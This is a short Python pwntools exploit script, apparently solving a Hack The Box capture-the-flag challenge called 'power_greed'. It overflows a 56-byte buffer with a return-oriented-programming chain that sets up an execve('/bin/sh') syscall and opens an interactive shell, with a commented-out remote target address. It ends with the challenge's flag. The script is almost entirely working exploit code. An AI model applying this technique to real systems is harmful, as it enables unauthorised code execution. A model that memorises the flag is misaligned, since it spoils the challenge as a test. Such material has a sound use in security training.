from pwn import *
p=process("./power_greed")
# p=remote("94.237.62.237",42536)
e=context.binary=ELF("./power_greed",checksec=False)
offset=56
p.sendline(b"1")
p.sendline(b"1")
# p.sendline(b"y")
p.sendlineafter("to test that? (y/n): ",b"y")

rsi=0x000000000040c002 #: pop rsi ; pop rbp ; ret
rdi=0x0000000000402bd8 #: pop rdi ; pop rbp ; ret
rax=0x000000000040668e #: mov rax, rsi ; ret
rdx=0x000000000042914b #: mov rdx, rbx ; syscall
rbx=0x000000000046ca97 #: pop rbx ; ret

string_binsh=0x481778

buf = e.bss() 

pay = flat([
    b'A' * offset,
    rdi,string_binsh, 0, rsi ,0x3b,0, rax, rsi ,0,0
    , rbx, 0, rdx
])
print(len(pay))
p.sendline(pay)

p.interactive()
#HTB{p0w3R_g41d_r34ct1on_40f022a6965ab64b4478e903d16d83f8}
